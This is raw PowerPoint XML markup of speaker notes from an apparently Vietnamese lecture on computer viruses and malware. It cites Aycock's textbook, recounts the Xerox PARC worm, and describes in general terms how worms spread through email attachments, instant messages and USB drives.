          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>49</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26500059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Theo tiếp cận của </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Aycock, J. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="1" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Computer Viruses and Malware. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>New York: Springer, 2006. (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>AYCO06</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>50</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35486361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8F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>52</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34052278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sz="1200"/>
              <a:t>Concept seen in John Brunner’s “Shockwave Rider”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1200"/>
              <a:t>Implemented by Xerox Palo Alto labs in 1980’s, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>It was nonmalicious, searching for idle</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>systems to use to run a computationally intensive task.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1200"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>54</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="335451081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1200" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>- Email, IM: macrro hoặc script code ch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ứa trong các tài liệu đính kèm </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1200" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>email hoặc file truyền qua các </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ứng dụng instant message, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>mã của nó được chạy khi email hoặc tập tin đính kèm được nhận hoặc xem.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" noProof="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>- Chia sẻ file: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200" noProof="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>tạo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>một bản sao của chính nó hoặc </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>lây nhiễm </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>các loại</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> file</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> phù hợp khác</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>như một virus trên phương tiện di động như ổ USB; nó sau đó thực </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>thi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> khi</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>ổ đĩa được kết nối với một hệ thống khác sử dụng cơ chế tự động chạy bằng</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>khai thác một số lỗ hổng phần mềm hoặc khi người dùng mở tệp bị nhiễm bệnh</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>về hệ thống mục tiêu.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>55</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="341963506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1200" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>- Email, IM: macrro hoặc script code ch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ứa trong các tài liệu đính kèm </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1200" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>email hoặc file truyền qua các </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ứng dụng instant message, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>mã của nó được chạy khi email hoặc tập tin đính kèm được nhận hoặc xem.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" noProof="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>- Chia sẻ file: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200" noProof="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>tạo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>một bản sao của chính nó hoặc </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>lây nhiễm </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>các loại</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> file</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> phù hợp khác</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>như một virus trên phương tiện di động như ổ USB; nó sau đó thực </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>thi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> khi</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>ổ đĩa được kết nối với một hệ thống khác sử dụng cơ chế tự động chạy bằng</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>khai thác một số lỗ hổng phần mềm hoặc khi người dùng mở tệp bị nhiễm bệnh</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>về hệ thống mục tiêu.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>56</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="406389336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1200" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>- Email, IM: macrro hoặc script code ch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ứa trong các tài liệu đính kèm </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1200" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>email hoặc file truyền qua các </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ứng dụng instant message, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>mã của nó được chạy khi email hoặc tập tin đính kèm được nhận hoặc xem.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" noProof="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>- Chia sẻ file: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200" noProof="1">
